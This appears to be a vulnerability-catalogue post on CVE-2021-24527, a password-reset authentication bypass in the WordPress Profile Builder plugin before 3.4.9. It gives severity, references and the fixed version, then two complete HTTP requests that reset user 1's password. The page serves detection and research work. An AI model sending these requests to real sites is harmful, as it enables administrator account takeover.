---
layout: post
cve_id: CVE-2021-24527
title: Profile Builder < 3.4.9 - Improper Authentication
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24527.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24527.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Sourabh-Sahu
severity: critical
impact: 'Unauthenticated attackers can reset passwords for any user including administrators
  without authorization, leading to complete site compromise and account takeover.

  '
remediation: Fixed in 3.4.9
reference:
- https://wpscan.com/vulnerability/c142e738-bc4b-4058-a03e-1be6fca47207/
- https://nvd.nist.gov/vuln/detail/CVE-2021-24527
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-24527
  epss-score: 0.69958
  epss-percentile: 0.98612
  cwe-id: CWE-287
  cpe: cpe:2.3:a:cozmoslabs:profile_builder:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 2
  verified: true
  vendor: cozmoslabs
  product: profile-builder
  publicwww-query: /wp-content/plugins/profile-builder/
tags:
- cve
- cve2021
- wp
- wp-plugin
- wordpress
- profile-builder
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The Profile Builder plugin before 3.4.9 for WordPress allows unauthenticated attackers to gain administrative access by exploiting an improper authentication vulnerability in the password reset functionality. An attacker can reset the password of any user, including administrators, without proper authorization, leading to a complete site compromise.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-admin//?key=%3Ca%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin//?key=%3Ca%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Connection: close
Content-Length: 901
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8nxJ9mBo6lwGYE0K
Accept-Encoding: gzip

------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="passw1"

ygDNKBoa
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="userData"

1
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="passw2"

ygDNKBoa
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="recover_password2"

Reset Password
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="action2"

recover_password2
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="key"

<a>
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="password_recovery_nonce_field2"

nR4XRE
------WebKitFormBoundary8nxJ9mBo6lwGYE0K
Content-Disposition: form-data; name="_wp_http_referer"

/?key=%3Ca%
------WebKitFormBoundary8nxJ9mBo6lwGYE0K--
```

